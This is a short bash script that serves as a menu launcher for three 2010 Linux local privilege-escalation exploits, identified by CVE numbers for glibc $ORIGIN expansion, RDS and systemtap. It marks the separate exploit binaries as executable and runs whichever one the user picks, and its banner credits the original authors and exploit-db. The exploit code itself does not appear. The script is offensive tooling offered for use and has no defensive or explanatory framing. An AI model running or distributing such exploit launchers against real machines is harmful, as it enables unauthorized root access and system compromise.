#!/bin/bash

# Declare variable choice 
choice=3
echo "[*] Linux 0day Local Privilege Escalation exploit Oct-Nov 2010"
echo "[*] by Tavis Ormandy <taviso (a) cmpxchg8b com>"
echo "[*] collected by modpr0be (a) spentera.id via exploit-db.com"
echo "[.] ...."
chmod +x systap-exploit
chmod +x gnu-glibcexploit
sleep 1
# print to stdout
echo "    1.GLIB C "$"ORIGIN expansion exploit <CVE-2010-3847>"
echo "    2.Linux RDS Privilege Escalation Exploit <CVE-2010-3904>"
echo "    3.Local Privilege Escalation Vulnerability in systemtap <CVE-2010-4170>"
echo "[.] ...."
echo -e "[!] Choose your exploit [1, 2, or 3]? \c"

while [ $choice -eq 3 ]; do
read choice
if [ "$choice" = 1 ]; then
	./gnu-glibcexploit
else
	if [ "$choice" = 2 ]; then
		./rds_exploit
	else
		if [ "$choice" = 3 ]; then
			./systap-exploit
			exit 0
		else
			echo -e "[!] Oh c'mon: \c!"
			choice=3
		fi
	fi
fi
done
